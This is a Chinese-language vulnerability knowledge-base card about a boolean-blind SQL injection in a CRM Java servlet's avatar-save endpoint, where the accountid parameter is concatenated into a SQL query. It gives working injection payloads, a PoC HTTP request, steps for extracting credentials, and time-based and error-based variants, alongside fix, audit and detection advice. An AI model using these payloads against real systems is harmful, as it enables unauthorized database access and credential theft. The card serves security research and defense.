---
id: web-generic-sqli-java-servlet-accountid-concat-boolean
title: Java Servlet accountid 参数直拼 SQL 导致布尔盲注（CRM 头像保存接口）
type: scenario
domain: web
path: web/generic/sqli
technique: java-servlet-accountid-sql-concat-boolean
tags:
- java
- sql-injection
- servlet
- boolean-blind
- crm
- web
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T09:12:54+08:00'
  notes: 已对照原文及17张图核对：图02 web.xml 将 ImgController 映射到 /headimgsave；图03 doProcess 中 accountid=request.getParameter("accountid")；图05 AccountPO.getAc 用 "select id from account where id='"+id+"'" 拼接并 findDomain 执行；图04 分支按 getAc 结果返回会员不存在/头像已有/头像保存成功，可作布尔 oracle。原文只给 payload accountid=1'and 1<@@VERSION--，未附成功/失败响应截图，卡内 confidence medium 恰当。原文无产品版本，未设 affected_versions。PoC 未在本机执行。
url: /docs/web/generic/sqli/web-generic-sqli-java-servlet-accountid-concat-boolean/
draft: false
kb_aliases:
- CRM accountid SQL 注入
- ImgController SQL 注入
- AccountPO.getAc 拼接注入
- '@@VERSION 布尔盲注'
---

## 一句话结论

CRM 头像保存 Servlet 从请求参数 `accountid` 取值后，经 `AccountPO.getAc()` 用字符串拼接进 `select id from account where id='...'`，未使用预编译；攻击者可注入 `1'and 1<@@VERSION--` 等条件，根据接口返回“会员不存在/头像已有/保存成功”的差异做布尔盲注。

## 原理

- **可控源**：`ImgController.doProcess()` 中 `String accountid = request.getParameter("accountid")`，完全来自 HTTP 请求。
- **危险汇聚点**：`new AccountPO(conn, us).getAc(accountid)`；`getAc(String id)` 执行 `String sql = "select id from account where id='" + id + "'"`，随后 `this.findDomain(sql, 0, 0)` 执行。单引号闭合后即可追加任意 SQL 条件。
- **布尔 oracle**：`getAc` 返回结果集是否非空；非空时进入 `checkImg`/`saveHeadImg` 分支，返回“头像已有/头像保存成功”，空则返回“会员不存在”。攻击者可让注入条件为真/假，观察 message 差异，逐位提取数据。
- **为什么成立**：SQL 文本在业务层拼接，数据库驱动没有预编译占位符，引号与注释符都按 SQL 语法解释；`@@VERSION` 在 MySQL/SQL Server 中均可读取版本，可用于确认注入。
- **原文验证边界**：文章给出 payload `accountid=1'and 1<@@VERSION--`，但未附成功/失败响应截图；本卡按代码与 payload 判定为可复现的布尔盲注，confidence 定为 medium。

## 触发条件

- 目标为包含该 CRM 组件的 Java Web 应用，`ImgController` 映射的 `/headimgsave`（或等价 servlet 路径）可达。
- `accountid` 参数进入 `AccountPO.getAc()` 的拼接 SQL，数据库为 MySQL/SQL Server 等支持 `--` 注释与 `@@VERSION` 的类型。
- 接口对存在/不存在会员的响应不同（message 或状态码），可作为布尔 oracle。
- 无预编译/WAF 拦截单引号与注释符；若有 WAF，可用编码、注释变体绕过。

## 利用步骤

1. 访问头像保存接口（web.xml 中 ImgController 映射 `/headimgsave`），带参数 `accountid`。
2. 先发 `accountid=1'and 1=1--` 与 `accountid=1'and 1=2--`，比较“会员不存在/头像已有”等响应差异，确认布尔注入。
3. 用 `accountid=1'and 1<@@VERSION--` 确认数据库类型/版本条件；再按布尔盲注逐位提取 `database()`、表名、账号口令。
4. 也可用 `' or '1'='1` 让查询恒真，观察是否进入头像保存分支；必要时配合时间盲注（`sleep()`/`waitfor delay`）在无回显时提取。

## PoC

```http
GET /headimgsave?accountid=1%27and%201%3C%40%40VERSION--&headimgurl=http://example/x.png HTTP/1.1
Host: target
```

原文 payload（未编码形式）：

```text
accountid=1'and 1<@@VERSION--
```

响应差异示例（按代码分支）：

```text
条件为真且账号存在 -> {"message":"头像已有"} 或 {"message":"头像保存成功"}
条件为假/账号不存在 -> {"message":"会员不存在"}
```

## 变体与关联

- **恒真绕过**：`accountid=' or '1'='1` 使 `getAc` 恒真，绕过会员存在性检查。
- **其他注入位置**：同一 CRM 中若其他 `AccountPO`/DAO 方法也拼接 id/name，可用相同 payload；审计时全局搜索 `"select ... where ...='"+`。
- **盲注升级**：布尔盲注可换时间盲注（MySQL `sleep(5)`、SQL Server `waitfor delay '0:0:5'`）或报错注入（`extractvalue`/`updatexml`）。
- **关联**：JDBC/MyBatis 拼接注入审计、`${}` 注入、登录绕过类 SQLi 卡片；本卡是 Java Servlet 参数直拼的最小形态。

## 检测与防御

- **修复**：改用 `PreparedStatement` 占位符或 ORM 参数绑定；`accountid` 做格式校验（如仅允许数字/UUID），拒绝引号、注释符。
- **代码审计**：搜索 `request.getParameter` 后进入 `findDomain`/`executeQuery`/`createQuery` 的拼接路径，重点看 `where`、`order by`、`like` 位置。
- **检测**：请求参数含 `'`、`--`、`@@VERSION`、`sleep(`、`waitfor`、`extractvalue` 等特征；同一 IP 对同一接口高频发送相似请求并观察响应差异；数据库日志出现拼接后的异常 SQL。
- **防御**：最小权限数据库账号、关闭详细 SQL 报错、WAF 拦截常见注入特征（但不能替代预编译）。
